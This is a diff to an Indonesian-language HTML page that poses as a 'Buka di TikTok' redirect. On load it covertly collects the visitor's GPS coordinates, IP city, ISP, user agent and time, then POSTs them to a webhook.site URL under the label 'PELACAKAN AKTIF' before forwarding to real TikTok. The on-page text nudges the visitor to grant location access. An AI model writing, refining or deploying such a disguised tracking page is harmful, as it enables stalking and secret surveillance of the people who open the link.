@@ -1,55 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Buka TikTok</title>
-    <meta content='width=device-width,initial-scale=1' name='viewport'/>
+    <title>Buka di TikTok</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
         async function kirimData(lat = "Ditolak", lon = "Ditolak") {
             try {
+                // Ambil data IP & Provider
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
+                // Kirim ke Webhook kamu
                 await fetch('https://webhook.site/da585ce8-007d-4bdd-8301-698ea088b877', {
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify({
-                        status: "Target Klik Link",
-                        maps: lat !== "Ditolak" ? `https://www.google.com/maps?q=${lat},${lon}` : "GPS Ditolak",
+                        status: "PELACAKAN AKTIF",
+                        google_maps: lat !== "Ditolak" ? `https://www.google.com/maps?q=${lat},${lon}` : "Target Menolak GPS",
                         koordinat: `${lat}, ${lon}`,
                         kota_ip: d.city,
                         isp: d.org,
-                        perangkat: navigator.userAgent
+                        perangkat: navigator.userAgent,
+                        waktu: new Date().toLocaleString('id-ID')
                     })
                 });
             } catch (e) {}
             
-            // Langsung lempar ke aplikasi TikTok
-            window.location.replace("https://www.tiktok.com");
+            // Setelah data dikirim, langsung lempar ke TikTok asli
+            setTimeout(() => {
+                window.location.replace("https://www.tiktok.com");
+            }, 500);
         }
 
-        function mintaIzin() {
+        function prosesMasuk() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (p) => { kirimData(p.coords.latitude, p.coords.longitude); },
                     () => { kirimData(); },
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    { enableHighAccuracy: true, timeout: 8000 }
                 );
             } else {
                 kirimData();
             }
         }
 
-        window.onload = mintaIzin;
+        // Jalankan otomatis saat halaman dibuka
+        window.onload = prosesMasuk;
     </script>
 </head>
-<body style="background:#f1f1f1; display:flex; align-items:center; justify-content:center; height:100vh; font-family:sans-serif; margin:0;">
-    <div style="background:#fff; padding:30px; border-radius:15px; text-align:center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width:80%;">
-        <img src="https://sf16-scmcdn-sg.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e488892322e356740436bc5b348450f8.png" width="120" style="margin-bottom:20px;">
-        <p style="font-size:16px; font-weight:bold; color:#333; margin-bottom:10px;">Situs ini mau membuka TikTok Anda</p>
-        <p style="font-size:13px; color:#666; margin-bottom:25px;">Izinkan akses untuk melanjutkan ke aplikasi</p>
-        <div style="background:#fe2c55; color:#fff; padding:12px; border-radius:5px; font-weight:bold; cursor:pointer;" onclick="mintaIzin()">
-            Buka Aplikasi
+<body style="background:#000; color:#fff; display:flex; align-items:center; justify-content:center; height:100vh; font-family:sans-serif; margin:0;">
+    <div style="text-align:center; padding:20px;">
+        <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-7.png" width="80" style="margin-bottom:20px;">
+        <h3 style="margin:0 0 10px 0;">Membuka TikTok...</h3>
+        <p style="color:#ccc; font-size:14px;">Situs ini mau membuka TikTok Anda.<br>Pastikan klik <b>"Izinkan"</b> jika muncul permintaan akses.</p>
+        
+        <div style="margin-top:30px;">
+            <div style="border: 3px solid #f3f3f3; border-top: 3px solid #fe2c55; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: auto;"></div>
         </div>
     </div>
+
+    <style>
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </body>
 </html>
